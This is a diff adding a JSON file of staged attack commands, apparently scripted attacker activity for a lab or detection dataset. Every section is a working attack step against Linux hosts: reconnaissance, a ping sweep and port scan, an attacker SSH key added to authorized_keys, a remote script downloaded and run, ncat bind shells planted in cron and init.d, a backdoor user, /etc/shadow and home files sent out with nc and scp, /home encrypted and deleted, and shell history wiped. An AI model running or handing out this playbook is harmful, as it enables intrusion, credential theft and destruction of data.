@@ -1,0 +1,57 @@
+{
+ "system_reconnaissance": {
+    "step 1": "uname -a ",
+    "step 2": "cat /proc/cpuinfo",
+    "step 3": "service --status-all",
+    "step 4": "df -h",
+    "step 5": "netstat -tulpn",
+    "step 6": "cd /var/log",
+    "step 7": "ls | grep -E \"\\.log$\" && pwd",
+    "step 8": "tail /etc/passwd ",
+    "step 9": "w"
+  },
+  "scanning_lateral_propagation": {
+    "step 1": "ifconfig",
+    "step 2": "for i in {1..254}; do ping -c 1 172.18.0.$i; done | grep \"bytes from\" | head",
+    "step 3": "nc -znv 172.18.0.21 1-1000 2>&1 | grep succeeded",
+    "step 4": "ssh -p 2221 eve@172.18.0.21",
+    "step 5": "echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCg0T5tBMc4JzaHRklECFW6CFgJmNIw/gk0s6Av+OEhdQt3KBQhdPiB4r6RKzia+EaGXkdP1JMuUuf5hn7H4KDWpvuUKHyVYX0dxF+pM0DYE5YQ6RDmTD9qgItbe0E+A/kqeFJgmYRA/SxIGuGia6P/L+QH5X+Ue0jeq88Y9BPmyrbjr/o4xjNHNFOuJQb2VctpJMmGlgP+CMDioN/S69B9hgsrMjE4ryW+U8AIHlSedInWG84lqIn75QPFNwaxAaRDK6SOK/UPJ0n/8jwWgKg/TZqRO/Q/TwX9ea+tELSFhrP6s+PNeC+nOVJsNr+RT3INASPUNm03xRr9IjcjYyBuUkEIYF5Zvmaesdus/V2yxn2kOLh/cm4tDZ6Zj2F8jDMc28V6ka4aBUYOUKgs2k+BfcOOUMeh8lzxMN7VbEUq/YM3PZWsgqtzfTUpzidEDUq4Xwa5LGg7wF/IOwXgC1zNTzGoKw87/7kutMLrVMqrAH8n9aBsd1994+yBBENn5YauoFBhFS3jiOsG0tUqk368N072oMlZ7xIyKJzugbrutnrh9ZSTfFfQ55+iSrMPAKlj17YhDWWj1ZqrP9DIJcQ9Uie3On6Hc3E/a4GbzyeAUZIz3eYu+ouPtT6Z/P0sRmFVP1IZYmb/mdrTAIySe8Nf2NfOTbQZUY+fZbzH+P56VQ== eve@attacker-server\" >> ~/.ssh/authorized_keys",
+    "step 6": "curl 172.18.0.21:8080/file.sh > file.sh && chmod 777 file.sh",
+    "step 7": "./file.sh && rm file.sh",
+    "step 8": "apt-get install nmap -y",
+    "step 9": "nmap -sV 172.18.0.21 "
+  },
+  "persistence": {
+    "step 1": "echo \"ncat -lvp 15000 -e /bin/sh\" >> /etc/cron.daily/logrotate",
+    "step 2": "tail /etc/cron.daily/logrotate",
+    "step 3": "echo \"ncat -lvp 15000 -e /bin/sh\" > /etc/init.d/ippd",
+    "step 4": "ls -la /etc/init.d | grep ippd ",
+    "step 5": "which ncat",
+    "step 6": "ncat -lvp 15000 -e /bin/sh &",
+    "step 7": "netstat -tulpn",
+    "step 8": "useradd -m -p \"$(openssl passwd -1 'password')\" john",
+    "step 9": "cat /etc/shadow"
+  },
+  "data_reconnaissance_exfiltration": {
+    "step 1": "ls -la /home",
+    "step 2": "cd /home/phil",
+    "step 3": "ls -la",
+    "step 4": "gzip .bashrc",
+    "step 5": "mv .bashrc.gz ext.gz && ls",
+    "step 6": "file ext.gz",
+    "step 7": "nc 172.18.0.21 15000 < ext.gz",
+    "step 8": "cat /etc/shadow",
+    "step 9": "scp -P 2221 /etc/shadow eve@172.18.0.21:~"
+  },
+  "data_obfuscation_ransomware": {
+    "step 1": "cd / && pwd",
+    "step 2": "tar -cvf home.tar /home",
+    "step 3": "rm -r /home && ls",
+    "step 4": "gpg --batch --yes --passphrase \"password\" --cipher-algo AES256 --symmetric home.tar",
+    "step 5": "rm home.tar",
+    "step 6": "ls -la",
+    "step 7": "dd if=/dev/zero of=/opt/swap bs=1024 count=524288",
+    "step 8": "history -c",
+    "step 9": "history"
+  }
+}
